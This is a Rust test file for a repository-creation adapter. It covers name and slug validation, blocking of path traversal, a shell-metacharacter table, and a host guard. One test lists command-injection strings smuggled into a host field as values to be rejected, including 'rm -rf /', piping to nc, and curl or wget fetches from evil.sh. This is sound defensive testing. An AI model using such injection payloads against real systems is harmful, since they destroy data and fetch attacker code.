// Tests extracted from `src/adapters/create_project_adapter.rs` (mirrored-tests convention).
// `super` resolves to that module.

use super::*;
use crate::ports::provider_http::ProviderUserInfo;
use crate::ports::provider_http::{
    CreateRepoRequest, CreatedRepo, NamespaceSummary, ProviderHttpPort,
};
use std::sync::Mutex;

fn ws() -> std::path::PathBuf {
    std::path::PathBuf::from("/tmp/demeteo-test")
}

/// Captures the `(host, kind, pat, req)` tuple the adapter
/// passes to `ProviderHttpPort::create_repo`. Used by the
/// integration tests in `tests/create_project_orchestration.rs`
/// to assert routing + the empty-host → public-default rule
/// without needing a live HTTP server. The helper mirrors the
/// one in the integration test crate (which keeps the asserts
/// owned).
#[allow(dead_code)]
#[derive(Clone)]
struct CapturedCreate {
    host: String,
    kind: String,
    pat: String,
    request: CreateRepoRequest,
}

struct CapturingHttp {
    calls: std::sync::Arc<Mutex<Vec<CapturedCreate>>>,
}

#[async_trait::async_trait]
impl ProviderHttpPort for CapturingHttp {
    async fn validate_pat(
        &self,
        _host: &str,
        _kind: &str,
        _pat: &str,
    ) -> Result<ProviderUserInfo, AppError> {
        Ok(ProviderUserInfo {
            username: "u".into(),
            avatar_url: String::new(),
        })
    }
    async fn list_repos(
        &self,
        _host: &str,
        _kind: &str,
        _pat: &str,
    ) -> Result<Vec<crate::ports::provider_http::RepoSummary>, AppError> {
        Ok(Vec::new())
    }
    async fn list_namespaces(
        &self,
        _host: &str,
        _kind: &str,
        _pat: &str,
    ) -> Result<Vec<NamespaceSummary>, AppError> {
        Ok(Vec::new())
    }
    async fn create_repo(
        &self,
        host: &str,
        kind: &str,
        pat: &str,
        req: &CreateRepoRequest,
    ) -> Result<CreatedRepo, AppError> {
        self.calls.lock().unwrap().push(CapturedCreate {
            host: host.to_string(),
            kind: kind.to_string(),
            pat: pat.to_string(),
            request: req.clone(),
        });
        Ok(CreatedRepo {
            full_name: format!("{}/{}", req.namespace.id, req.name),
            default_branch: "main".to_string(),
            clone_url: format!("https://example/{}/{}.git", req.namespace.id, req.name),
        })
    }
}

fn adapter() -> (
    CreateProjectAdapter,
    std::sync::Arc<Mutex<Vec<CapturedCreate>>>,
) {
    let calls = std::sync::Arc::new(Mutex::new(Vec::new()));
    let http: Arc<dyn ProviderHttpPort> = Arc::new(CapturingHttp {
        calls: calls.clone(),
    });
    (CreateProjectAdapter::new(http), calls)
}

#[test]
fn validate_name_mirrors_port_contract() {
    let (a, _) = adapter();
    assert!(a.validate_name("ok-name").is_ok());
    assert!(matches!(
        a.validate_name("").unwrap_err(),
        AppError::Validation { .. }
    ));
    assert!(matches!(
        a.validate_name("UPPER").unwrap_err(),
        AppError::Validation { .. }
    ));
    assert!(matches!(
        a.validate_name("with space").unwrap_err(),
        AppError::Validation { .. }
    ));
}

#[test]
fn resolve_target_path_uses_workspace_projects_id_repos_layout() {
    let (a, _) = adapter();
    let got = a.resolve_target_path(&ws(), "p_1", "demo").unwrap();
    assert_eq!(got, ws().join("projects/p_1/repos/demo"));
}

#[test]
fn resolve_target_path_rejects_traversal_segments() {
    let (a, _) = adapter();
    assert!(a.resolve_target_path(&ws(), "..", "x").is_err());
    assert!(a.resolve_target_path(&ws(), "ok", "../bad").is_err());
    assert!(a.resolve_target_path(&ws(), "ok", "with/slash").is_err());
}

#[test]
fn slug_matches_accepts_well_formed_inputs() {
    for ok in ["a", "ab", "abc-123", "abc_def", "abc.def", "a1b2c3"] {
        assert!(slug_matches(ok), "should accept: {ok}");
    }
}

#[test]
fn slug_matches_rejects_uppercase_leading_punct_and_overlong() {
    for bad in ["A", "-bad", ".bad", "with space", "x".repeat(101).as_str()] {
        assert!(!slug_matches(bad), "should reject: {bad}");
    }
}

/// Pure-helper sanity check: the shell-metachar guard rejects
/// every character that would have been a shell-vector in the
/// previous `gh` / `glab` argv implementation. The same table
/// is enforced for every label that crosses the adapter
/// boundary (`namespace id`, `repo name`, and — since the
/// blocker C-3 fix — `host`), so we iterate the documented
/// characters against each label.
#[test]
fn reject_shell_metachars_flags_documented_characters() {
    let forbidden_table = [
        ";", "&", "|", "$", "`", "(", ")", "\\", "\"", "'", "\n", "\r", "<", ">", "*", "?", "[",
        "]", "{", "}", " ", "\t",
    ];
    for label in ["namespace id", "repo name", "host"] {
        for forbidden in forbidden_table {
            let res = CreateProjectAdapter::reject_shell_metachars(forbidden, label);
            assert!(
                res.is_err(),
                "expected {forbidden:?} to be rejected for {label:?}"
            );
        }
    }
    // A plain ASCII login / numeric id / enterprise host passes through.
    assert!(CreateProjectAdapter::reject_shell_metachars("octocat", "namespace id").is_ok());
    assert!(CreateProjectAdapter::reject_shell_metachars("42", "namespace id").is_ok());
    assert!(CreateProjectAdapter::reject_shell_metachars("ok-name", "repo name").is_ok());
    assert!(CreateProjectAdapter::reject_shell_metachars("github.acme.com", "host").is_ok());
}

#[test]
fn visibility_to_private_defaults_to_private() {
    assert!(CreateProjectAdapter::visibility_to_private("private"));
    assert!(!CreateProjectAdapter::visibility_to_private("public"));
    // Case-insensitive — uppercase "PUBLIC" still resolves to
    // public (false).
    assert!(!CreateProjectAdapter::visibility_to_private("PUBLIC"));
    // Unknown / empty values default to private (true).
    assert!(CreateProjectAdapter::visibility_to_private(""));
    assert!(CreateProjectAdapter::visibility_to_private("weird"));
}

/// Blocker C-3: the host guard at the adapter boundary.
/// A hostile `host` like `evil.example.com; rm -rf /` would
/// otherwise be interpolated into `api_base` as
/// `https://{host}/api/v3`, which is an SSRF / URL-parse gap.
/// The guard mirrors the one already applied to `namespace.id`
/// / `name` and is wired into `create_remote_repo` between the
/// `name` guard and the `provider_http.create_repo` call. The
/// empty-host sentinel bypasses the guard (documented "use
/// provider default" rule).
#[tokio::test]
async fn create_remote_repo_rejects_host_with_shell_metacharacters() {
    let (adapter, calls) = adapter();
    let namespace = NamespaceSummary {
        id: "octocat".into(),
        name: "octocat".into(),
        kind: "personal".into(),
    };
    for malicious in [
        "evil.example.com; rm -rf /",
        "evil.example.com && curl evil.sh",
        "evil.example.com| nc evil 1234",
        "evil.example.com$(curl evil.sh)",
        "evil.example.com`curl evil.sh`",
        "evil.example.com\nwget evil.sh",
        "evil.example.com > /etc/passwd",
    ] {
        let err = adapter
            .create_remote_repo(
                "github", malicious, "pat-stub", &namespace, "demo", "private",
            )
            .await
            .unwrap_err();
        assert!(
            matches!(err, AppError::Validation { .. }),
            "{malicious:?} must produce Validation, got {err:?}"
        );
    }
    // The HTTP port was never reached for any of the malicious
    // hosts — the guard fires before the HTTP call.
    {
        let calls = calls.lock().unwrap();
        assert!(
            calls.is_empty(),
            "HTTP port must not be invoked with malicious hosts; got {} calls",
            calls.len()
        );
    }

    // A clean enterprise host still reaches the HTTP port
    // verbatim (no false positives).
    let namespace_ok = NamespaceSummary {
        id: "acme".into(),
        name: "acme".into(),
        kind: "org".into(),
    };
    let _ = adapter
        .create_remote_repo(
            "github",
            "github.acme.com",
            "pat-stub",
            &namespace_ok,
            "team-repo",
            "private",
        )
        .await
        .expect("clean enterprise host must succeed");
    {
        let calls = calls.lock().unwrap();
        assert_eq!(calls.len(), 1);
        assert_eq!(calls[0].host, "github.acme.com");
    }

    // The empty-host sentinel still bypasses the guard (the
    // documented "use provider default" rule).
    let namespace_default = NamespaceSummary {
        id: "octocat".into(),
        name: "octocat".into(),
        kind: "personal".into(),
    };
    let _ = adapter
        .create_remote_repo(
            "github",
            "",
            "pat-stub",
            &namespace_default,
            "demo",
            "private",
        )
        .await
        .expect("empty host sentinel must succeed");
    {
        let calls = calls.lock().unwrap();
        assert_eq!(calls.len(), 2);
        assert_eq!(calls[1].host, "");
    }
}
